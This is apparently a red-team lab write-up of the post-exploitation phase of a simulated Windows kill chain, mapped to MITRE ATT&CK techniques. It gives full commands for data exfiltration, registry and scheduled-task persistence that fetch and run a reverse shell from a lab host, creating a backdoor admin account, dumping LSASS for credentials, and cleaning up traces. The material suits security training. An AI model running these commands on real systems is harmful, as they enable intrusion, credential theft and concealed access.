## Phase 7: Actions on Objectives (TA0009)

**MITRE ATT&CK Phase:** TA0009 - Actions on Objectives  
**Objective:** Achieve final objectives such as data exfiltration, persistence, and credential extraction after gaining full SYSTEM-level access.

---

### ✅ Step 1: Identify Valuable Data (Discovery)
**Techniques:**
- **T1083 – File and Directory Discovery**
- **T1005 – Data from Local System**

Used PowerShell and Command Prompt commands to navigate the file system and locate sensitive documents:

```powershell
cd C:\Users\Server\Documents
```

Found the file `Top_Secrets.txt`.

---

### ✅ Step 2: Exfiltrate Data (Collection/Exfiltration)
**Technique:**
- **T1041 – Exfiltration Over Command and Control Channel**

Set up a Python HTTP server on the attacker machine:
```bash
python3 -m http.server 8000
```

Downloaded the file to the attacker’s system via PowerShell curl:
```powershell
Invoke-WebRequest -Uri http://192.168.50.10:8000/Top_Secrets.txt -OutFile Top_Secrets.txt
```

Alternatively used `certutil`:
```powershell
certutil -urlcache -split -f http://192.168.50.10:8000/Top_Secrets.txt Top_Secrets.txt
```

---

### ✅ Step 3: Establish Persistence

#### 🛠️ Step 3.1: Registry Run Key (T1547.001)
Added a reverse shell to run at startup via registry:
```powershell
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v updater /t REG_SZ /d "powershell -WindowStyle Hidden -nop -c \"iex(New-Object Net.WebClient).DownloadString('http://192.168.50.10:8000/rev.ps1')\"" /f
```

#### 🛠️ Step 3.2: Add Admin User (T1136.001)
Created a new persistent admin user:
```powershell
net user backdoor Passw0rd! /add
net localgroup administrators backdoor /add
```

#### 🛠️ Step 3.3 (Optional): Scheduled Task for Reverse Shell (T1053.005)
```powershell
schtasks /create /tn "SystemUpdater" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command IEX(New-Object Net.WebClient).DownloadString('http://192.168.50.10:8000/rev.ps1')" /sc ONSTART /ru SYSTEM
```

---

### ✅ Step 4: Extract More Credentials
**Technique:**
- **T1003.001 – LSASS Memory Dump**

Dumped LSASS using procdump:
```powershell
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
```

Downloaded and analyzed with mimikatz or secretsdump to extract further credentials.

---

### ✅ Step 5: Cleanup Traces
**Technique:**
- **T1070.004 – File Deletion**

Deleted artifacts like tools, scripts, downloaded files, and log entries:
```powershell
del rev.ps1
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v updater /f
schtasks /delete /tn "SystemUpdater" /f
net user backdoor /del
```

---

### 🔐 MITRE Techniques Summary:
- **T1083** – File and Directory Discovery
- **T1005** – Data from Local System
- **T1041** – Exfiltration Over C2 Channel
- **T1547.001** – Registry Run Key Persistence
- **T1136.001** – Create Local Account
- **T1053.005** – Scheduled Task
- **T1003.001** – LSASS Credential Dumping
- **T1070.004** – File Deletion

---

### ✅ Conclusion
In this final phase, I achieved the objective of maintaining access, extracting credentials, exfiltrating sensitive files, and erasing traces. With this, the full red team kill chain simulation is complete.

All steps were documented and screenshots were taken for verification.

---
